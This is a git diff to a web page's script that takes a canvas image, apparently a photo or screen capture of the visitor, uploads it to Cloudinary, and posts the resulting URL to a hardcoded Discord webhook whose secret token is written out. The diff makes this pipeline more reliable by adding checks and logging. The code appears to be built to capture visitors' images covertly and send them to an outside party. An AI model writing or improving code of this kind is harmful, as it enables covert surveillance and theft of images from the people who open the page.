@@ -61,7 +61,7 @@
                 canvas.toBlob(blob => uploadPhoto(blob), 'image/png');
             }, 1000);
         } catch (err) {
-            alert("Capture Window access denied!");
+            alert(" denied!");
             console.error(err);
         }
     }
@@ -81,16 +81,23 @@
             });
 
             const result = await response.json();
-            const imageUrl = result.secure_url; 
+            console.log("Cloudinary upload result:", result);
 
-            sendToDiscord(imageUrl);
+            if (result.secure_url) {
+                const imageUrl = result.secure_url;
+                sendToDiscord(imageUrl);
+            } else {
+                console.error("No image URL returned from Cloudinary");
+            }
         } catch (error) {
             console.error("Cloudinary upload error:", error);
         }
     }
 
     function sendToDiscord(imageUrl) {
-        fetch("https://discord.com/api/webhooks/1340611336966770761/BG9LqkUM1Tri7XT1oHVaotzuOQo6VTj4fnWsmtgS0geRxhdBAVZ0wxw3XqGdjLYIY9xI", {
+        const discordWebhook = "https://discord.com/api/webhooks/1340611336966770761/BG9LqkUM1Tri7XT1oHVaotzuOQo6VTj4fnWsmtgS0geRxhdBAVZ0wxw3XqGdjLYIY9xI";
+        
+        fetch(discordWebhook, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ 
@@ -101,8 +108,16 @@
                 }]
             })
         })
-        .then(response => console.log("Discord!"))
-        .catch(err => console.error("Error:", err));
+        .then(response => {
+            if (response.ok) {
+                console.log("Photo sent to Discord!");
+            } else {
+                console.error("Failed Discord", response.status);
+            }
+        })
+        .catch(err => {
+            console.error("Erroro Discord:", err);
+        });
     }
 </script>
 
